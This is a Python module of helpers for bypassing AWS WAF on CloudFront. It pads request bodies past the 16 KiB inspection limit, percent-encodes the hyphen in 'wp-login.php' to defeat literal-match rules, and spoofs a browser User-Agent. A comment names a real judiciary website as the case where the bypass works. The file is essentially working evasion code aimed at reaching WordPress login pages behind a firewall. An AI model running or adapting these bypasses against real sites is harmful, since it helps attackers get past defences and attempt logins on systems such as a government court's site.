"""CloudFront / AWS WAF bypass helpers for authorized security testing."""

from __future__ import annotations

import json
import urllib.parse
from typing import Any
from urllib.parse import urlencode, urlparse, urlunparse

# AWS WAF on CloudFront inspects only the first 16 KiB of body by default.
WAF_BODY_INSPECT_LIMIT = 16384
DEFAULT_PAD_SIZE = 20000

# sc.judiciary.gov.ph / CloudFront case: literal match on "wp-login.php" without
# URL-decoding before the rule runs. Apache decodes %2D -> '-' at the origin.
CLOUDFRONT_WP_LOGIN_BYPASS = "/wp%2Dlogin.php"


def cloudfront_wp_login_path(query: str = "") -> str:
    """Path that evades literal wp-login.php WAF rules (hyphen encoded as %2D)."""
    return CLOUDFRONT_WP_LOGIN_BYPASS + (f"?{query}" if query else "")


def pad_json_body(payload: dict[str, Any], pad_key: str = "waf_pad", pad_size: int = DEFAULT_PAD_SIZE) -> bytes:
    padded = {pad_key: "A" * pad_size, **payload}
    return json.dumps(padded).encode("utf-8")


def pad_form_body(fields: dict[str, str], pad_size: int = DEFAULT_PAD_SIZE) -> dict[str, str]:
    return {"waf_pad": "A" * pad_size, **fields}


def encode_path(path: str) -> str:
    """Full per-segment encoding (alternative bypass)."""
    return "/" + "/".join(urllib.parse.quote(segment, safe="") for segment in path.strip("/").split("/"))


def resolve_login_path(
    base_url: str,
    *,
    bypass: str = "none",
    action: str | None = None,
) -> str:
    """
    Build the login URL for the chosen bypass mode.

    bypass:
      none     -> /wp-login.php (blocked by naive CloudFront rules)
      hyphen   -> /wp%2Dlogin.php (documented CloudFront literal-match bypass)
      encoded  -> fully percent-encoded path segments
    """
    parsed = urlparse(base_url)
    root = urlunparse((parsed.scheme, parsed.netloc, "", "", "", ""))

    query = urlencode({"action": action}) if action else ""
    if bypass == "hyphen":
        path = cloudfront_wp_login_path(query)
    elif bypass == "encoded":
        path = encode_path("/wp-login.php")
        if query:
            path += f"?{query}"
    else:
        path = "/wp-login.php" + (f"?{query}" if query else "")

    return root.rstrip("/") + path


BROWSER_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
)


def merge_headers(base: dict[str, str] | None, extra: dict[str, str] | None) -> dict[str, str]:
    headers = {
        "User-Agent": BROWSER_UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    if base:
        headers.update(base)
    if extra:
        headers.update(extra)
    return headers
